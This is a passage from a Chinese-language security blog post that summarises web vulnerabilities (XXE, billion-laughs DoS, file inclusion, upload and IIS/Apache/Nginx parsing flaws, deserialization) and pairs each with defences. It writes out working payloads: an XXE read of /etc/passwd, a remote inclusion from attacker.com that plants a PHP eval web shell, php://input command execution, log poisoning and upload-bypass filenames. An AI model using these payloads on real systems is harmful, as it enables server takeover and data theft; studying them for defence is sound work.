&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>POC中中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串此时解析数据时未做特别处理，即可能造成拒绝服务攻击。<br>此外还有一种可能造成拒绝服务的Payload,借助读取/dev/random实现.<br>内网信息<br>借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息<br>文件读取</p>
<p>最常规也是最有效的利用思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xdsec [</span><br><span class="line">&lt;!ELEMENT methodname ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;methodcall&gt;</span><br><span class="line">&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;</span><br><span class="line">&lt;/methodcall&gt;</span><br></pre></td></tr></table></figure>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol>
<li>检查所使用的底层xml解析库，默认禁止外部实体的解析</li>
<li>使用第三方应用代码及时升级补丁</li>
<li>同时增强对系统的监控，防止此问题被人利用<br>对于PHP,由于simplexml_load_string函数的XML解析问题出在libxml库上,所以加载实体前可以调用这样一个函数</li>
</ol>
<h3 id="六-文件包含漏洞"><a href="#六-文件包含漏洞" class="headerlink" title="六.  文件包含漏洞"></a>六.  文件包含漏洞</h3><p>include() , include_once() , require_once() , fopen() , readfile() ，<br>只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析。包含非PHP语法规范源文件时，将会暴露其源代码。<br>本地包含：本地包含故名思议，就是在网站服务器的本身存在恶意文件，然后本地包含使用。<br>要想成功利用文件包含漏洞，需要满足下面两个条件：<br>1.include()等函数通过动态变量的方式引入需要包含的文件。<br>2.用户能够控制该动态变量</p>
<p>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>include_once()和require_once()：若文件中代码已被包含则不会再次包含<br>远程包含：远程包含，就是调用其他网站的恶意文件进行打开。远程包含，要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态。如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
<p>1.读取敏感文件<br>访问URL：<a href="http://www.xxser.com/index.php?page=/etc/passwd" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=/etc/passwd</a><br>如果目标主机文件存在，并且有相应的权限，那么就可以读出文件的内容。反之，就会得到一个类似于;open_basedir restriction in effect的警告。<br>2.远程包含Shell<br>如果目标主机allow_url_fopen选项是激活的，就可以尝试远程包含一句话木马，如：<a href="http://www.attacker.com/echo.txt，代码如下：" target="_blank" rel="noopener">http://www.attacker.com/echo.txt，代码如下：</a><br>&lt;?php fputs(fopen(“shell.php”,”w”),”&lt;?php eval(\$_POST[xxser]);?&gt;”);?&gt;<br>访问：<a href="http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：" target="_blank" rel="noopener">http://www.example.com/index.php?page=http://www.attacker.com/echo.txt。将会在index.php所在的目录下生成shell.php，内容为：</a><br>&lt;?php eval($_POST[xxser]);?&gt;<br>3.本地包含配合文件上传<br>假设已经上传一句话图片木马到服务器，路径为：/uploadfile/xxx.jpg<br>图片代码如下：&lt;?php fputs(fopen(“shell.php”,”w”),”&lt;?php eval(\$_POST[xxser]);?&gt;”);?&gt;<br>访问URL：<a href="http://www.example.com/index.php?page=./uploadfile/xxx.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。" target="_blank" rel="noopener">http://www.example.com/index.php?page=./uploadfile/xxx.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php。</a><br>4.使用PHP封装协议<br>4.1 使用封装协议读取PHP文件<br>例子如下：<a href="http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php" target="_blank" rel="noopener">http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php</a><br>访问URL，得到经过Base64加密后的字符串，这段代码就是Base64加密过后的PHP源代码，解密后就可得到原本的“样貌”。<br>4.2 写入PHP文件<br>在allow_url_include为On时，构造URL：<a href="http://www.example.com/index.php?page=php://input，并且提交数据为：" target="_blank" rel="noopener">http://www.example.com/index.php?page=php://input，并且提交数据为：</a>&lt;?php system(‘net user’);?&gt;<br>会得到net user命令的结果。<br>5.包含Apache日志文件<br>本地文件包含的利用。<br>Apache有两个日志文件：access.log（访问日志）和error.log（错误日志）。<br>攻击者先访问<a href="http://www.example.com/" target="_blank" rel="noopener">http://www.example.com/</a>&lt;?php phpinfo();?&gt;,操作这一步时，需要Burp，否则&lt;,&gt;,空格都会被转码。<br>随后访问<a href="http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log" target="_blank" rel="noopener">http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log</a><br>使用这种方式时，找到Apache的路径是关键。<br>6.截断包含<br>&lt;?php<br>if(isset($_GET[‘page’])){<br>include $_GET[‘page’].”.php”;<br>}else{<br>include ‘home.php’;<br>}<br>?&gt;<br>如果此时存在一个图片木马，名为1.jpg，可以输入如下URL：<a href="http://www.example.com/index.php?page=1.jpg%00" target="_blank" rel="noopener">http://www.example.com/index.php?page=1.jpg%00</a><br>当然这种方法只适用于magic_quotes_gpc=Off的情况下。<br>7.绕过WAF防火墙<br>图片木马一般不会被web杀毒软件查出来。<br>四、防御方法<br>1.严格判断包含的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制；<br>2.路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”；<br>3.包含文件验证：验证被包含的文件是否是白名单中的一员；<br>4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(“head.php”);。<br>后记<br>include和require语句是相同的，除了错误处理方面：<br>reuqire会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include只生成错误报告（E_WARING），并且脚本会继续<br>require和require_once的差别是，require重复调用会多次加载你引用的文件，而require_once只加载一次，而不管你实际上调用了多少次，主要用于复杂的文件包含关系。<br>include和include_once的差别也可以以此类推。</p>
<h2 id="八-文件上传漏洞"><a href="#八-文件上传漏洞" class="headerlink" title="八.  文件上传漏洞"></a>八.  文件上传漏洞</h2><p>   文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力<br>文件上传后导致的常见安全问题一般有:</p>
<ol>
<li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。</li>
<li>上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似);</li>
<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li>
</ol>
<p><strong>造成恶意文件上传的原因主要有三种：</strong><br><strong><em>文件上传时检查不严。</em></strong>没有进行文件格式检查。一些应用仅仅在客户端进行了检查，而在专业的攻击者眼里几乎所有的客户端检查都等于没有检查，攻击者可以通过NC，Fiddler等断点上传工具轻松绕过客户端的检查。一些应用虽然在服务器端进行了黑名单检查，但是却可能忽略了大小写，如将.php改为.Php即可绕过检查；一些应用虽然在服务器端进行了白名单检查却忽略了%00截断符，如应用本来只允许上传jpg图片，那么可以构造文件名为xxx.php%00.jpg,其中%00为十六进制的0x00字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为%00字符截断的关系，最终上传的文件变成了xxx.php。</p>
<p><strong><em>文件上传后修改文件名时处理不当。</em></strong>一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</p>
<p><strong><em>使用第三方插件时引入。</em></strong>好多应用都引用了带有文件上传功能的第三方插件，这些插件的文件上传功能实现上可能有漏洞，攻击者可通过这些漏洞进行文件上传攻击。如著名的博客平台WordPress就有丰富的插件，而这些插件中每年都会被挖掘出大量的文件上传漏洞。</p>
<h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h3><ol>
<li>文件上传的目录设置为不可执行<br>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</li>
<li>判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
<li>使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li>
<li>单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li>
</ol>
<p>客户端校验绕过；<br>服务端校验绕过；<br>文件头校验绕过；<br>拓展名校验绕过；</p>
<p> <a href="http://wt7315.blog.51cto.com/10319657/1865580" target="_blank" rel="noopener">参考网址</a> </p>
<p>八.  解析漏洞总结</p>
<h3 id="IIS解析漏洞："><a href="#IIS解析漏洞：" class="headerlink" title="IIS解析漏洞："></a>IIS解析漏洞：</h3><h4 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h4><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。</p>
<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h4 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h4><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
<h4 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h4><p><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">www.xxxx.xxx.com/test.php.php123</a><br>其余配置问题导致漏洞<br>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件</p>
<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<h4 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h4><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a><br>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h3 id="IIS7-5-解析漏洞"><a href="#IIS7-5-解析漏洞" class="headerlink" title="IIS7.5 解析漏洞"></a>IIS7.5 解析漏洞</h3><p>反序列化IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
<h4 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h4><p>上传不符合windows文件命名规则的文件名<br>test.asp.<br>test.asp(空格)<br>test.php:1.jpg<br>test.php:: $DATA<br>会被windows系统自动去掉不符合规则符号后面的内容。</p>
<p>如图访问ip/Netsys/HtmlEdit/fckeditor/editor/filemanager/connectors/test.html<br><img src="/2017/11/13/web常见通用漏洞原理总结/image1.png" title="web常见通用漏洞原理总结"></p>
<p>点击Create Folder新建文件夹<br><img src="/2017/11/13/web常见通用漏洞原理总结/image2.png" title="web常见通用漏洞原理总结"></p>
<p>用brup suite进行改包，将%2F改为a.asp。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image3.png" title="web常见通用漏洞原理总结"></p>
<p>点击Get Folders获得文件夹。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image4.png" title="web常见通用漏洞原理总结"></p>
<p>上传文件，我这里上传了一句话图片木马，然后能看到上传的路径，访问的是1.asp/FI201610191827336199.jpg，会被当作asp执行，用菜刀连接getshell。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image5.png" title="web常见通用漏洞原理总结"></p>
<h2 id="九-变量覆盖漏洞"><a href="#九-变量覆盖漏洞" class="headerlink" title="九.  变量覆盖漏洞"></a>九.  变量覆盖漏洞</h2><p>register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。通过$GLOBALS获取的变量，也可能导致变量覆盖。<br>extract()变量覆盖，PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
<h2 id="十-反序列化漏洞（对象注入漏洞）"><a href="#十-反序列化漏洞（对象注入漏洞）" class="headerlink" title="十.  反序列化漏洞（对象注入漏洞）"></a>十.  反序列化漏洞（对象注入漏洞）</h2><p>序列化是什么serialize() 是为了将对象或数组等转变为正常的字符串。用于保存内容或传参数等等。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。<br>反序列化就是把一个序列化好的字符串作为输入，返回原来的数组和对象。<br>serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
<p>Php中有这样的特性函数被称为魔幻方法。他们可以被自动的调用。所以这些函数不需要通过函数来调用。<br>反序列化都送通过_construct()初始化，通过_wakeup()苏醒，执行完后有 _destruct() 销毁。那么这些魔幻函数中存在的代码实惠被执行的。而这些代码又恰好被我们控制的话。漏洞就产生了。<br>利用的两个基本条件：<br>应用程序中必须含有一个实现某一个php魔幻方法的类，可以用这个类进行攻击。<br>调用脆弱的unserialize() ,必须声明攻击旗舰所使用的所有类。否则必须为这些类支持对象自动加载。<br>最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。<br><a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="noopener">参考链接1</a><br><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/" target="_blank" rel="noopener">参考链接2</a></p>

      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/11/13/代理设置抓https包/" rel="next" title="代理设置抓https包">
                <i class="fa fa-chevron-left"></i> 代理设置抓https包
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/12/07/afl使用内存盘fuzz/" rel="prev" title="afl使用内存盘fuzz">
                afl使用内存盘fuzz <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Inhaltsverzeichnis
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Übersicht
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">18</span>
                    <span class="site-state-item-name">Artikel</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">4</span>
                    <span class="site-state-item-name">Tags</span>
                  
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-SQL注入漏洞"><span class="nav-number">1.</span> <span class="nav-text">一.  SQL注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL的字符集转换过程"><span class="nav-number">1.1.</span> <span class="nav-text">MYSQL的字符集转换过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">二次注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-XSS脚本攻击"><span class="nav-number">2.</span> <span class="nav-text">二.  XSS脚本攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reflected-XSS（反射型XSS）"><span class="nav-number">2.1.</span> <span class="nav-text">Reflected XSS（反射型XSS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Stored-XSS（存储型XSS）"><span class="nav-number">2.2.</span> <span class="nav-text">Stored XSS（存储型XSS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM-based-or-local-XSS"><span class="nav-number">2.3.</span> <span class="nav-text">DOM-based or local XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-CSRF跨站点请求伪造-Cross—Site-Request-Forgery"><span class="nav-number">3.</span> <span class="nav-text">三.  CSRF跨站点请求伪造(Cross—Site Request Forgery)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御CSRF攻击："><span class="nav-number">3.1.</span> <span class="nav-text">防御CSRF攻击：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）验证-HTTP-Referer-字段"><span class="nav-number">3.1.1.</span> <span class="nav-text">（1）验证 HTTP Referer 字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）在请求地址中添加-token-并验证"><span class="nav-number">3.1.2.</span> <span class="nav-text">（2）在请求地址中添加 token 并验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（3）在-HTTP-头中自定义属性并验证"><span class="nav-number">3.1.3.</span> <span class="nav-text">（3）在 HTTP 头中自定义属性并验证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四-SSRF服务器端请求伪造"><span class="nav-number">4.</span> <span class="nav-text">四.  SSRF服务器端请求伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防范："><span class="nav-number">4.1.</span> <span class="nav-text">防范：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤的绕过"><span class="nav-number">4.2.</span> <span class="nav-text">过滤的绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五-命令执行漏洞："><span class="nav-number">5.</span> <span class="nav-text">五.  命令执行漏洞：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六-XXE-XML-外部实体注入"><span class="nav-number">6.</span> <span class="nav-text">六.  XXE XML 外部实体注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">6.1.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#六-文件包含漏洞"><span class="nav-number">6.2.</span> <span class="nav-text">六.  文件包含漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八-文件上传漏洞"><span class="nav-number">7.</span> <span class="nav-text">八.  文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#防御方法："><span class="nav-number">7.1.</span> <span class="nav-text">防御方法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS解析漏洞："><span class="nav-number">7.2.</span> <span class="nav-text">IIS解析漏洞：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#目录解析-6-0"><span class="nav-number">7.2.1.</span> <span class="nav-text">目录解析(6.0)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件解析"><span class="nav-number">7.2.2.</span> <span class="nav-text">文件解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解析文件类型"><span class="nav-number">7.2.3.</span> <span class="nav-text">解析文件类型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-解析漏洞"><span class="nav-number">7.3.</span> <span class="nav-text">Apache 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原理"><span class="nav-number">7.3.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞形式"><span class="nav-number">7.3.2.</span> <span class="nav-text">漏洞形式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复方案"><span class="nav-number">7.3.3.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx解析漏洞"><span class="nav-number">7.4.</span> <span class="nav-text">Nginx解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞原理-1"><span class="nav-number">7.4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞形式-1"><span class="nav-number">7.4.2.</span> <span class="nav-text">漏洞形式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS7-5-解析漏洞"><span class="nav-number">7.5.</span> <span class="nav-text">IIS7.5 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#配合操作系统文件命令规则"><span class="nav-number">7.5.1.</span> <span class="nav-text">配合操作系统文件命令规则</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#九-变量覆盖漏洞"><span class="nav-number">8.</span> <span class="nav-text">九.  变量覆盖漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十-反序列化漏洞（对象注入漏洞）"><span class="nav-number">9.</span> <span class="nav-text">十.  反序列化漏洞（对象注入漏洞）</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  

  
</div>




  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
